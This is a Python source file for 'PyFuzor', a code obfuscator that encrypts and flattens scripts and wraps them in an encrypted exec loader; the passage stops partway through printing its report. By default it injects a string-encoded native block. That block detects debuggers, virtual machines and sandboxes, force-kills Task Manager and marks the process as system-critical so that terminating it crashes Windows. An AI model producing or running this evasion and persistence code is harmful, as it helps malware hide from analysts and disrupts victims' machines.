import ast
import json
import sys
import os
import secrets
import string
import builtins
import time
import base64
import marshal
import types
import random
import zlib
from alive_progress import alive_bar

def get_random_name(prefix="PyFuzor_", length=8):
    return prefix + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))

class Scope:
    def __init__(self, scope_type, parent=None):
        self.scope_type = scope_type
        self.parent = parent
        self.definitions = {}
        self.globals = set()
        self.nonlocals = set()

    def resolve(self, name):
        if name in self.definitions:
            return self.definitions[name]
        if name in self.globals:
            return self.resolve_global(name)
        if name in self.nonlocals:
             if self.parent:
                 return self.parent.resolve(name)
             return None
        curr = self.parent
        while curr:
            if curr.scope_type == 'class':
                curr = curr.parent
                continue
            if name in curr.definitions:
                return curr.definitions[name]
            if name in curr.globals:
                return curr.resolve_global(name)
            curr = curr.parent
        return None

    def resolve_global(self, name):
        if self.scope_type == 'global':
            return self.definitions.get(name)
        if self.parent:
            return self.parent.resolve_global(name)
        return None

cl_builtins = set(dir(builtins))

class SymbolTableBuilder(ast.NodeVisitor):
    def __init__(self, config, exclusions):
        self.config = config
        self.exclusions = set(exclusions)
        self.root_scope = Scope('global')
        self.current_scope = self.root_scope
        self.scope_map = {}
        _rv = config.get("rename_variables", True)
        self.rename_enabled = _rv.get("enabled", True) if isinstance(_rv, dict) else bool(_rv)
        self.global_renames = {}

    def visit_Module(self, node):
        self.scope_map[node] = self.current_scope
        self.generic_visit(node)

    def visit_ClassDef(self, node):
        if self.rename_enabled:
             self._define_name(node.name, is_attr=True)

        class_scope = Scope('class', parent=self.current_scope)
        self.scope_map[node] = class_scope
        old_scope = self.current_scope
        self.current_scope = class_scope
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_FunctionDef(self, node):
        if self.rename_enabled:
            self._define_name(node.name, is_attr=True)

        func_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = func_scope
        old_scope = self.current_scope
        self.current_scope = func_scope

        if self.rename_enabled:
            for arg in (node.args.args + node.args.kwonlyargs):
                self._define_name(arg.arg, is_attr=True)
            if node.args.vararg: self._define_name(node.args.vararg.arg, is_attr=True)
            if node.args.kwarg: self._define_name(node.args.kwarg.arg, is_attr=True)

        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_Global(self, node):
        for name in node.names: self.current_scope.globals.add(name)

    def visit_Nonlocal(self, node):
        for name in node.names: self.current_scope.nonlocals.add(name)

    def visit_Import(self, node):
        if self.rename_enabled:
            for alias in node.names:
                name = alias.asname if alias.asname else alias.name.split('.')[0]
                self._define_name(name)

    def visit_ImportFrom(self, node):
        if self.rename_enabled:
            for alias in node.names:
                name = alias.asname if alias.asname else alias.name
                self._define_name(name)

    def visit_Name(self, node):
        if self.rename_enabled and isinstance(node.ctx, ast.Store):
            is_attr = (self.current_scope.scope_type == 'class')
            self._define_name(node.id, is_attr=is_attr)

    def _define_name(self, name, is_attr=False):
        if name in self.exclusions or (name.startswith('__') and name.endswith('__')) or name in cl_builtins:
            return

        if is_attr:
            if name not in self.global_renames:
                self.global_renames[name] = get_random_name()
            self.current_scope.definitions[name] = self.global_renames[name]
            return

        scope = self.current_scope
        if name in scope.globals: scope = self.root_scope
        elif name in scope.nonlocals: return
        if name not in scope.definitions:
            if name in self.global_renames:
                scope.definitions[name] = self.global_renames[name]
            else:
                scope.definitions[name] = get_random_name(prefix="PyFuzor_", length=12)

class ProfessionalObfuscator(ast.NodeTransformer):
    def __init__(self, config, symbol_builder):
        self.config = config
        _rv = config.get("rename_variables", True)
        self.rename_enabled = _rv.get("enabled", True) if isinstance(_rv, dict) else bool(_rv)
        self.current_scope = symbol_builder.root_scope
        self.scope_map = symbol_builder.scope_map
        self.global_renames = symbol_builder.global_renames
        self.exclusions = symbol_builder.exclusions
        self.ffi_enabled = config.get("ffi_obfuscation", {}).get("enabled", True)
        self.wrappers_needed = False
        self.flow_lib_name = "PyFuzor_Flow"

    def _enter_scope(self, node):
        if node in self.scope_map: self.current_scope = self.scope_map[node]
    def _exit_scope(self):
        if self.current_scope.parent: self.current_scope = self.current_scope.parent

    def _get_junk_statement(self):
        name = get_random_name(prefix="PyFuzor_", length=4)
        choice = secrets.randbelow(3)
        if choice == 0:
            return ast.Assign(targets=[ast.Name(id=name, ctx=ast.Store())], value=ast.Constant(value=secrets.randbelow(100)))
        elif choice == 1:
            return ast.Expr(value=ast.Call(func=ast.Name(id='len', ctx=ast.Load()), args=[ast.Constant(value=name)], keywords=[]))
        else:
            return ast.If(test=ast.Constant(value=False), body=[ast.Pass()], orelse=[])

    def _insert_junk(self, body):
        conf = self.config.get("junk_code", {})
        if not conf.get("enabled", True):
            return body

        intensity = conf.get("intensity", 15) # max. 100
        new_body = []
        for stmt in body:
            if secrets.randbelow(100) < intensity:
                new_body.append(self._get_junk_statement())
            new_body.append(stmt)
        return new_body

    def visit_Module(self, node):
        self._enter_scope(node)
        self.generic_visit(node)
        node.body = self._insert_junk(node.body)
        self._exit_scope()
        return node

    def visit_ClassDef(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.name)
            if new_name: node.name = new_name
        self._enter_scope(node)
        self.generic_visit(node)
        node.body = self._insert_junk(node.body)
        self._exit_scope()
        return node

    def visit_FunctionDef(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.name)
            if new_name: node.name = new_name

        if self.config.get("control_flow_flattening", {}).get("enabled", True) and len(node.body) >= 3:
            node.body = self._flatten_control_flow(node.body)

        self._enter_scope(node)
        self.generic_visit(node)
        node.body = self._insert_junk(node.body)
        self._exit_scope()
        return node

    def _flatten_control_flow(self, body):
        state_var = get_random_name(prefix="PyFuzor_", length=4)

        declarations = []
        logic = []
        for stmt in body:
            if isinstance(stmt, (ast.Global, ast.Nonlocal, ast.Import, ast.ImportFrom)):
                declarations.append(stmt)
            else:
                logic.append(stmt)

        if len(logic) < 2: return body

        blocks = []
        for i, stmt in enumerate(logic):
            curr_id = i + 1
            next_id = i + 2 if i < len(logic) - 1 else 0

            if isinstance(stmt, ast.Return):
                next_id = 0

            block_body = [stmt]
            if next_id != 0:
                block_body.append(ast.Assign(targets=[ast.Name(id=state_var, ctx=ast.Store())], value=ast.Constant(value=next_id)))
            else:
                block_body.append(ast.Assign(targets=[ast.Name(id=state_var, ctx=ast.Store())], value=ast.Constant(value=0)))

            blocks.append((curr_id, block_body))

        secrets.SystemRandom().shuffle(blocks)

        if_chain = None
        for bid, bbody in blocks:
            test = ast.Compare(left=ast.Name(id=state_var, ctx=ast.Load()), ops=[ast.Eq()], comparators=[ast.Constant(value=bid)])
            if if_chain is None:
                if_chain = ast.If(test=test, body=bbody, orelse=[])
            else:
                if_chain = ast.If(test=test, body=bbody, orelse=[if_chain])

        init_state = ast.Assign(targets=[ast.Name(id=state_var, ctx=ast.Store())], value=ast.Constant(value=1))
        while_loop = ast.While(
            test=ast.Compare(left=ast.Name(id=state_var, ctx=ast.Load()), ops=[ast.NotEq()], comparators=[ast.Constant(value=0)]),
            body=[if_chain] if if_chain else [ast.Pass()],
            orelse=[]
        )

        return declarations + [init_state, while_loop]

    def visit_arg(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.arg)
            if new_name: node.arg = new_name
        return self.generic_visit(node)

    def visit_keyword(self, node):
        if self.rename_enabled and node.arg:
            if node.arg in self.global_renames:
                node.arg = self.global_renames[node.arg]
        return self.generic_visit(node)

    def visit_Name(self, node):
        if self.rename_enabled and isinstance(node.ctx, (ast.Load, ast.Store)):
            new_name = self.current_scope.resolve(node.id)
            if new_name: node.id = new_name
        return self.generic_visit(node)

    def visit_Import(self, node):
        if self.rename_enabled:
            for alias in node.names:
                local_name = alias.asname if alias.asname else alias.name.split('.')[0]
                new_name = self.current_scope.resolve(local_name)
                if new_name: alias.asname = new_name
        return self.generic_visit(node)

    def visit_ImportFrom(self, node):
        if self.rename_enabled:
            for alias in node.names:
                local_name = alias.asname if alias.asname else alias.name
                new_name = self.current_scope.resolve(local_name)
                if new_name: alias.asname = new_name
        return self.generic_visit(node)

    def visit_Global(self, node):
        if self.rename_enabled:
            node.names = [self.current_scope.resolve_global(n) or n for n in node.names]
        return node

    def visit_Nonlocal(self, node):
        if self.rename_enabled:
            node.names = [self.current_scope.resolve(n) or n for n in node.names]
        return node

    def visit_If(self, node):
        if not self.ffi_enabled: return self.generic_visit(node)
        self.wrappers_needed = True
        self.generic_visit(node)
        node.test = ast.Call(
            func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='ifchk', ctx=ast.Load()),
            args=[node.test], keywords=[]
        )
        return node

    def visit_IfExp(self, node):
        if not self.ffi_enabled: return self.generic_visit(node)
        self.wrappers_needed = True
        self.generic_visit(node)
        return ast.Call(
            func=ast.Subscript(
                value=ast.List(
                    elts=[
                        ast.Lambda(args=ast.arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=node.body),
                        ast.Lambda(args=ast.arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=node.orelse)
                    ],
                    ctx=ast.Load()
                ),
                slice=ast.Call(
                    func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='elseobf', ctx=ast.Load()),
                    args=[node.test], keywords=[]
                ),
                ctx=ast.Load()
            ),
            args=[], keywords=[]
        )

    def visit_Constant(self, node):
        if not self.config.get("string_encryption", {}).get("enabled", True):
            return node

        if isinstance(node.value, (str, bytes)):
            if node.value in self.exclusions:
                return node

            import zlib
            val = node.value
            if isinstance(val, str) and self.rename_enabled and val in self.global_renames:
                val = self.global_renames[val]

            is_bytes = isinstance(val, bytes)
            raw_data = val if is_bytes else val.encode('utf-8')

            if len(raw_data) > 15:
                compressed = zlib.compress(raw_data)
            else:
                compressed = raw_data

            k = secrets.randbelow(254) + 1
            encoded = base64.b64encode(bytes([((b + 7) % 256) ^ k for b in compressed])).decode()

            self.wrappers_needed = True
            method = 'decrypt' if isinstance(node.value, str) else 'decrypt_b'

            return ast.Call(
                func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr=method, ctx=ast.Load()),
                args=[ast.Constant(value=encoded), ast.Constant(value=k)],
                keywords=[]
            )
        elif isinstance(node.value, int) and not isinstance(node.value, bool):
            if -1000 < node.value < 1000:
                op_type = secrets.choice(['add', 'xor'])
                if op_type == 'add':
                    offset = secrets.randbelow(100) + 1
                    return ast.BinOp(left=ast.Constant(value=node.value - offset), op=ast.Add(), right=ast.Constant(value=offset))
                else:
                    k = secrets.randbelow(254) + 1
                    return ast.BinOp(left=ast.Constant(value=node.value ^ k), op=ast.BitXor(), right=ast.Constant(value=k))
        elif isinstance(node.value, bool):
            if not self.config.get("boolean_obfuscation", {}).get("enabled", True):
                return node

            val = node.value
            choice = secrets.randbelow(4)
            if val:
                if choice == 0:
                    return ast.Compare(left=ast.BinOp(left=ast.Constant(value=secrets.randbelow(100)), op=ast.BitAnd(), right=ast.Constant(value=0)), ops=[ast.Eq()], comparators=[ast.Constant(value=0)])
                elif choice == 1:
                    return ast.UnaryOp(op=ast.Not(), operand=ast.Compare(left=ast.Constant(value=1), ops=[ast.Eq()], comparators=[ast.Constant(value=2)]))
                elif choice == 2:
                    return ast.Compare(left=ast.Constant(value=secrets.randbelow(100)), ops=[ast.Lt()], comparators=[ast.Constant(value=200)])
                else:
                    return ast.UnaryOp(op=ast.Not(), operand=ast.UnaryOp(op=ast.Not(), operand=ast.Constant(value=secrets.choice([1, 2, 3]))))
            else:
                if choice == 0:
                    return ast.Compare(left=ast.BinOp(left=ast.Constant(value=secrets.randbelow(100)), op=ast.BitAnd(), right=ast.Constant(value=0)), ops=[ast.NotEq()], comparators=[ast.Constant(value=0)])
                elif choice == 1:
                    return ast.Compare(left=ast.Constant(value=1), ops=[ast.Eq()], comparators=[ast.Constant(value=2)])
                elif choice == 2:
                    return ast.Compare(left=ast.Constant(value=secrets.randbelow(100)), ops=[ast.Gt()], comparators=[ast.Constant(value=200)])
                else:
                    return ast.UnaryOp(op=ast.Not(), operand=ast.Constant(value=secrets.choice([1, 2, 3])))
        return node

    def visit_Attribute(self, node):
        attr_obf_on = self.config.get("attribute_obfuscation", {}).get("enabled", True)

        if node.attr in self.exclusions:
            return self.generic_visit(node)

        if isinstance(node.value, ast.Name) and node.value.id in ['sys', 'os', 'base64', 'marshal', 'types', 'zlib', 'secrets', 'time']:
            return self.generic_visit(node)

        attr_name = node.attr
        if self.rename_enabled and attr_name in self.global_renames:
            attr_name = self.global_renames[attr_name]

        if not attr_obf_on:
            node.attr = attr_name
            return self.generic_visit(node)

        if isinstance(node.ctx, ast.Load):
            return ast.Call(
                func=ast.Name(id='getattr', ctx=ast.Load()),
                args=[self.visit(node.value), self.visit(ast.Constant(value=attr_name))],
                keywords=[]
            )

        node.attr = attr_name
        return self.generic_visit(node)

    def visit_JoinedStr(self, node):
        if not self.config.get("string_encryption", {}).get("enabled", True):
            return self.generic_visit(node)

        res = None
        for val in node.values:
            curr = None
            if isinstance(val, ast.Constant):
                curr = self.visit_Constant(val)
            elif isinstance(val, ast.FormattedValue):
                expr = self.visit(val.value)
                if val.format_spec:
                    curr = ast.Call(func=ast.Name(id='format', ctx=ast.Load()), args=[expr, self.visit(val.format_spec)], keywords=[])
                else:
                    fname = 'str'
                    if val.conversion == 114: fname = 'repr'
                    elif val.conversion == 97: fname = 'ascii'
                    curr = ast.Call(func=ast.Name(id=fname, ctx=ast.Load()), args=[expr], keywords=[])

            if res is None: res = curr
            else: res = ast.BinOp(left=res, op=ast.Add(), right=curr)

        return res if res else ast.Constant(value="")

FFI_WRAPPER_SOURCE = r'''
class _PyFuzorFlow:
    def __init__(self):
        import sys
        if getattr(sys, 'gettrace', None) and sys.gettrace(): pass

    def elseobf(self, c): return int(not bool(c))
    def ifchk(self, c): return bool(c)

    def decrypt(self, d, k):
        import base64, zlib
        try:
            b = base64.b64decode(d)
            raw = bytes([((x ^ k) - 7) % 256 for x in b])
            try: return zlib.decompress(raw).decode('utf-8', 'ignore')
            except: return raw.decode('utf-8', 'ignore')
        except: return ""

    def decrypt_b(self, d, k):
        import base64, zlib
        try:
            b = base64.b64decode(d)
            raw = bytes([((x ^ k) - 7) % 256 for x in b])
            try: return zlib.decompress(raw)
            except: return raw
        except: return b""

PyFuzor_Flow = _PyFuzorFlow()
'''

ANTI_VM_SOURCE = r'''
def _pyfuzor_init_security():
    try:
        import cppyy
        import sys
        import os
        cppyy.cppdef("""
        #include <windows.h>
        #include <winternl.h>
        #include <string>
        #include <vector>
        #include <algorithm>

        std::string _dec(std::vector<unsigned char> data, unsigned char key) {
            std::string out;
            for (auto &b : data) out += (char)(b ^ key);
            return out;
        }

        typedef NTSTATUS (NTAPI *p_ni)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

        class _PyFuzor_Sec {
        public:
            static bool _run_all() {
                if (_c_dbg()) return true;
                if (_c_r_dbg()) return true;
                if (_c_p_proc()) return true;
                if (_c_b_win()) return true;
                if (_c_v_art()) return true;
                if (_c_h_res()) return true;
                if (_c_u_name()) return true;
                if (_c_u_time(1200)) return true;
                _k_bad();
                return false;
            }
            static bool _c_dbg() {
                typedef BOOL (WINAPI *pIDP)(VOID);
                auto f = (pIDP)GetProcAddress(GetModuleHandleA(_dec({0x21, 0x2f, 0x38, 0x24, 0x2f, 0x26, 0x79, 0x38, 0x72, 0x72}, 0x4a).c_str()), _dec({0x2b, 0x31, 0x06, 0x27, 0x20, 0x25, 0x25, 0x27, 0x30, 0x12, 0x30, 0x27, 0x31, 0x27, 0x2c, 0x36}, 0x42).c_str());
                return f ? f() : false;
            }
            static bool _c_r_dbg() {
                BOOL isP = FALSE;
                CheckRemoteDebuggerPresent(GetCurrentProcess(), &isP);
                return isP;
            }
            static bool _c_p_proc() {
                HMODULE hN = GetModuleHandleA(_dec({0x24, 0x3e, 0x2e, 0x26, 0x26, 0x64, 0x2e, 0x26, 0x26}, 0x4a).c_str());
                if (hN) {
                    auto q = (p_ni)GetProcAddress(hN, _dec({0x24, 0x1e, 0x3b, 0x1f, 0x1f, 0x18, 0x13, 0x33, 0x14, 0x1c, 0x15, 0x18, 0x17, 0x1b, 0x13, 0x13, 0x13, 0x35, 0x18, 0x15, 0x19, 0x1f, 0x13, 0x19, 0x3a, 0x18, 0x15, 0x19, 0x1f, 0x19, 0x13}, 0x6a).c_str());
                    if (q) {
                        PROCESS_BASIC_INFORMATION pbi;
                        ULONG len;
                        if (q(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len) == 0) {
                            HANDLE hP = OpenProcess(0x1000, FALSE, (DWORD)pbi.Reserved3);
                            if (hP) {
                                char buf[MAX_PATH];
                                DWORD sz = MAX_PATH;
                                if (QueryFullProcessImageNameA(hP, 0, buf, &sz)) {
                                    std::string n(buf);
                                    std::transform(n.begin(), n.end(), n.begin(), ::tolower);
                                    CloseHandle(hP);
                                    if (n.find(_dec({0x2f, 0x32, 0x3a, 0x26, 0x25, 0x38, 0x2f, 0x38, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)) == std::string::npos &&
                                        n.find(_dec({0x29, 0x27, 0x2e, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)) == std::string::npos) return true;
                                }
                                CloseHandle(hP);
                            }
                        }
                    }
                }
                return false;
            }
            static bool _c_b_win() {
                std::vector<std::string> b = {
                    _dec({0x2e, 0x24, 0x39, 0x3a, 0x33, 0x6b, 0x22, 0x2d, 0x3b}, 0x4a),
                    _dec({0x32, 0x76, 0x7d, 0x2e, 0x28, 0x2d}, 0x4a),
                    _dec({0x3a, 0x38, 0x25, 0x29, 0x2f, 0x39, 0x39, 0x6a, 0x22, 0x2b, 0x29, 0x21, 0x2f, 0x38}, 0x4a)
                };
                for (const auto& t : b) { if (FindWindowA(NULL, t.c_str())) return true; }
                return false;
            }
            static bool _c_v_art() {
                std::vector<std::string> p = {
                    _dec({0x03, 0x7a, 0x1c, 0x11, 0x21, 0x2c, 0x27, 0x3f, 0x3b, 0x1c, 0x1b, 0x31, 0x3b, 0x2c, 0x2d, 0x25, 0x7a, 0x19, 0x1a, 0x21, 0x3e, 0x2d, 0x33, 0x3b, 0x7a, 0x1e, 0x02, 0x27, 0x30, 0x05, 0x27, 0x3d, 0x3b, 0x21, 0x66, 0x3b, 0x31, 0x3b}, 0x4a),
                    _dec({0x03, 0x7a, 0x1c, 0x11, 0x21, 0x2c, 0x27, 0x3f, 0x3b, 0x1c, 0x1b, 0x31, 0x3b, 0x2c, 0x2d, 0x25, 0x7a, 0x19, 0x1a, 0x21, 0x3e, 0x2d, 0x33, 0x3b, 0x7a, 0x3e, 0x25, 0x25, 0x27, 0x3d, 0x3b, 0x21, 0x66, 0x3b, 0x31, 0x3b}, 0x4a)
                };
                for (const auto& s : p) { if (GetFileAttributesA(s.c_str()) != -1) return true; }
                return false;
            }
            static bool _c_h_res() { return (GetSystemMetrics(0) < 800 || GetSystemMetrics(1) < 600); }
            static bool _c_u_name() {
                char u[256]; DWORD s = sizeof(u);
                if (GetUserNameA(u, &s)) {
                    std::string n(u); std::transform(n.begin(), n.end(), n.begin(), ::tolower);
                    if (n.find(_dec({0x39, 0x2b, 0x24, 0x2e, 0x28, 0x25, 0x32}, 0x4a)) != std::string::npos) return true;
                }
                return false;
            }
            static bool _c_u_time(unsigned int m) { return (GetTickCount() / 1000) < m; }
            static void _k_bad() {
                std::vector<std::string> k = {_dec({0x3e, 0x2b, 0x39, 0x21, 0x27, 0x2d, 0x38, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)};
                for (const auto& p : k) {
                    std::string c = _dec({0x3e, 0x2b, 0x39, 0x21, 0x21, 0x23, 0x26, 0x26, 0x6a, 0x65, 0x0c, 0x6a, 0x65, 0x03, 0x07, 0x6a}, 0x4a) + p + _dec({0x6a, 0x74, 0x6a, 0x24, 0x3f, 0x26, 0x6a, 0x78, 0x3e, 0x6a, 0x2d, 0x21}, 0x4a);
                    system(c.c_str());
                }
            }
            static bool _s_crit() {
                if (IsUserAnAdmin()) {
                    HMODULE h = GetModuleHandleA(_dec({0x24, 0x3e, 0x2e, 0x26, 0x26, 0x64, 0x2e, 0x26, 0x26}, 0x4a).c_str());
                    if (h) {
                        auto a = (NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(h, _dec({0x18, 0x3e, 0x26, 0x0b, 0x2e, 0x20, 0x3f, 0x39, 0x3e, 0x1a, 0x38, 0x23, 0x3c, 0x23, 0x26, 0x2f, 0x2d, 0x2f}, 0x4a).c_str());
                        auto s = (NTSTATUS(NTAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(h, _dec({0x18, 0x3e, 0x26, 0x19, 0x2f, 0x3e, 0x1a, 0x38, 0x25, 0x29, 0x2f, 0x39, 0x39, 0x03, 0x39, 0x09, 0x38, 0x23, 0x3e, 0x23, 0x29, 0x2b, 0x26}, 0x4a).c_str());
                        if (a && s) { BOOLEAN e; a(20, 1, 0, &e); s(1, 0, 0); return true; }
                    }
                }
                return false;
            }
        };
        """)

        native = cppyy.gbl._PyFuzor_Sec
        if native._run_all():
             pass

        recent_path = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Recent')
        if os.path.exists(recent_path) and len(os.listdir(recent_path)) < 20:
             pass

        native._s_crit()
    except:
        pass

_pyfuzor_init_security()
'''

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding='utf-8')

ANSI_RESET = "\u001b[0m"
ANSI_CYAN = "\u001b[36m"
ANSI_MAGENTA = "\u001b[35m"
ANSI_YELLOW = "\u001b[33m"
ANSI_GREEN = "\u001b[32m"
ANSI_RED = "\u001b[31m"
ANSI_BOLD = "\u001b[1m"

LOGO = f"""
{ANSI_MAGENTA}{ANSI_BOLD}
 ██████╗ ██╗   ██╗███████╗██╗   ██╗███████╗ ██████╗ ██████╗
 ██╔══██╗╚██╗ ██╔╝██╔════╝██║   ██║╚══███╔╝██╔═══██╗██╔══██╗
 ██████╔╝ ╚████╔╝ █████╗  ██║   ██║  ███╔╝ ██║   ██║██████╔╝
 ██╔═══╝   ╚██╔╝  ██╔══╝  ██║   ██║ ███╔╝  ██║   ██║██╔══██╗
 ██║        ██║   ██║     ╚██████╔╝███████╗╚██████╔╝██║  ██║
 ╚═╝        ╚═╝   ╚═╝      ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
{ANSI_CYAN}         --- PYFUZOR OBFUSCATOR V2.0 (PRO) ---
{ANSI_RESET}"""

BYTECODE_LOADER_HEADER = '''
import marshal as _msh
import types as _typ
import base64 as _b64

def _pyfzr_load(enc, k, s):
    b = _b64.b64decode(enc)
    raw = bytes([((x ^ k) - 13) % 256 for x in b])
    shuffled = bytearray(len(raw))
    for i, idx in enumerate(s):
        shuffled[idx] = raw[i]
    code = _msh.loads(bytes(shuffled))
    return _typ.FunctionType(code, globals())

def _pyfzr_method(enc, k, s):
    fn = _pyfzr_load(enc, k, s)
    return fn
'''

def _encrypt_bytecode_v2(raw_bytes, key):
    n = len(raw_bytes)
    indices = list(range(n))
    rng = secrets.SystemRandom()
    rng.shuffle(indices)
    shuffled = bytearray(n)
    for i, idx in enumerate(indices):
        shuffled[i] = raw_bytes[idx]
    encoded = bytes([((b + 13) % 256) ^ key for b in shuffled])
    return base64.b64encode(encoded).decode(), indices

def _try_compile_func(node):
    func_src = ast.unparse(node)
    mod_code = compile(func_src, "<pyfuzor_bc>", "exec")
    func_code = None
    for const in mod_code.co_consts:
        if isinstance(const, types.CodeType):
            func_code = const
            break
    return func_code

def apply_bytecode_obfuscation(source_code, config):
    try:
        tree = ast.parse(source_code)
    except SyntaxError:
        return source_code

    skip_names = {
        "_pyfzr_load", "_pyfzr_method", "_pyfuzor_init_security",
        "_PyFuzorFlow", "clear_screen", "load_config",
        "process_obfuscation", "main_cli", "apply_bytecode_obfuscation",
        "_encrypt_bytecode", "_encrypt_bytecode_v2", "_try_compile_func",
    }

    new_body = []
    loader_injected = False
    method_patches = []

    def _obfuscate_func(node):
        """Try to encrypt a function. Returns (enc, key, shuffle) or None."""
        if node.decorator_list or node.name in skip_names or len(node.body) < 2:
            return None
        try:
            func_code = _try_compile_func(node)
            if func_code is None: return None
            if func_code.co_freevars or func_code.co_cellvars: return None
            raw = marshal.dumps(func_code)
            marshal.loads(raw)
            key = secrets.randbelow(254) + 1
            enc, shuffle = _encrypt_bytecode_v2(raw, key)
            return enc, key, shuffle
        except Exception:
            return None

    for node in tree.body:
        if isinstance(node, ast.FunctionDef):
            result = _obfuscate_func(node)
            if result:
                enc, key, shuffle = result
                assign = ast.Assign(
                    targets=[ast.Name(id=node.name, ctx=ast.Store())],
                    value=ast.Call(
                        func=ast.Name(id="_pyfzr_load", ctx=ast.Load()),
                        args=[ast.Constant(value=enc), ast.Constant(value=key),
                              ast.Constant(value=shuffle)],
                        keywords=[]
                    )
                )
                ast.fix_missing_locations(assign)
                new_body.append(assign)
                loader_injected = True
            else:
                new_body.append(node)

        elif isinstance(node, ast.ClassDef):
            new_body.append(node)
            for item in node.body:
                if not isinstance(item, ast.FunctionDef): continue
                if item.name.startswith('__') and item.name.endswith('__'): continue
                result = _obfuscate_func(item)
                if result:
                    enc, key, shuffle = result
                    patch = ast.Assign(
                        targets=[ast.Attribute(
                            value=ast.Name(id=node.name, ctx=ast.Load()),
                            attr=item.name,
                            ctx=ast.Store()
                        )],
                        value=ast.Call(
                            func=ast.Name(id="_pyfzr_method", ctx=ast.Load()),
                            args=[ast.Constant(value=enc), ast.Constant(value=key),
                                  ast.Constant(value=shuffle)],
                            keywords=[]
                        )
                    )
                    ast.fix_missing_locations(patch)
                    method_patches.append(patch)
                    loader_injected = True

        else:
            new_body.append(node)

    new_body.extend(method_patches)

    tree.body = new_body
    ast.fix_missing_locations(tree)
    result = ast.unparse(tree)

    if loader_injected:
        result = BYTECODE_LOADER_HEADER + result

    return result

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_config():
    config = {
        "ffi_obfuscation": {"enabled": True},
        "rename_variables": True,
        "anti_vm": {"enabled": True},
        "remove_comments": True,
        "string_encryption": {"enabled": True},
        "attribute_obfuscation": {"enabled": True},
        "boolean_obfuscation": {"enabled": True},
        "control_flow_flattening": {"enabled": True},
        "bytecode_obfuscation": {"enabled": False},
        "junk_code": {"enabled": True}
    }
    if os.path.exists("config.json"):
        try:
            with open("config.json", "r") as f:
                ext_config = json.load(f)
                config.update(ext_config)
        except: pass
    return config

def process_obfuscation(filename):
    if not filename.endswith(".py"):
        filename += ".py"

    if not os.path.exists(filename):
        print(f"{ANSI_RED}Error: File '{filename}' not found.{ANSI_RESET}")
        return

    config = load_config()

    exclusions = []
    if os.path.exists("exclusions.txt"):
        try:
            with open("exclusions.txt", "r") as f: exclusions = [l.strip() for l in f if l.strip()]
        except: pass

    with alive_bar(100, title=f'Protecting {filename}', bar='smooth', spinner='dots_waves') as bar:
        for _ in range(5): time.sleep(0.01); bar()
        with open(filename, "r", encoding="utf-8") as f: source = f.read()

        use_ast = False
        if config.get("rename_variables"): use_ast = True
        if config.get("ffi_obfuscation", {}).get("enabled"): use_ast = True
        if config.get("remove_comments"): use_ast = True

        output_code = ""

        if use_ast:
             for _ in range(10): time.sleep(0.01); bar()
             tree = ast.parse(source)

             for _ in range(20): time.sleep(0.01); bar()
             builder = SymbolTableBuilder(config, exclusions)
             builder.visit(tree)

             for _ in range(30): time.sleep(0.01); bar()
             obfuscator = ProfessionalObfuscator(config, builder)
             tree = obfuscator.visit(tree)
             ast.fix_missing_locations(tree)

             if obfuscator.wrappers_needed:
                wrapper_tree = ast.parse(FFI_WRAPPER_SOURCE)
                tree.body = wrapper_tree.body + tree.body

             if config.get("anti_vm", {}).get("enabled", True):
                antivm_tree = ast.parse(ANTI_VM_SOURCE)
                tree.body = antivm_tree.body + tree.body

             for _ in range(20): time.sleep(0.01); bar()
             output_code = ast.unparse(tree)

             if config.get("bytecode_obfuscation", {}).get("enabled", False):
                 output_code = apply_bytecode_obfuscation(output_code, config)

        else:
             for _ in range(60): time.sleep(0.01); bar()
             output_code = source
             if config.get("anti_vm", {}).get("enabled", True):
                 output_code = ANTI_VM_SOURCE + "\n" + output_code

        final_code_obj = compile(output_code, "<pyfuzor_elite>", "exec")
        raw_bc = marshal.dumps(final_code_obj)
        k = secrets.randbelow(254) + 1
        enc_bc, shuffle_bc = _encrypt_bytecode_v2(raw_bc, k)

        elite_wrapper = f"""import marshal, types, base64
def _e():
    enc = {repr(enc_bc)}
    k = {k}
    s = {repr(shuffle_bc)}
    b = base64.b64decode(enc)
    raw = bytes([((x ^ k) - 13) % 256 for x in b])
    sh = bytearray(len(raw))
    for i, idx in enumerate(s): sh[idx] = raw[i]
    exec(marshal.loads(bytes(sh)), globals())
if __name__ == "__main__": _e()
"""
        output_code = elite_wrapper

        base, _ = os.path.splitext(filename)
        out_name = f"{base}_pro.py"
        with open(out_name, "w", encoding="utf-8") as f: f.write(output_code)

    orig_size = len(source)
    new_size = len(output_code)
    ratio = (new_size / orig_size) * 100 if orig_size > 0 else 0

    print(f"\n{ANSI_GREEN}PYFUZOR SUCCESS!{ANSI_RESET} Protected code saved to: {ANSI_YELLOW}{out_name}{ANSI_RESET}")
    print(f"{ANSI_CYAN}┌───────────────────────────────────────────────┐")
    print(f"│ {ANSI_BOLD}Obfuscation Audit Report                      {ANSI_RESET}{ANSI_CYAN}│")
    print(f"├───────────────────────────────────────────────┤")
    print(f"│ Source Growth   : {ANSI_YELLOW}{ratio:.1f}%{ANSI_RESET}{ANSI_CYAN}                         │")
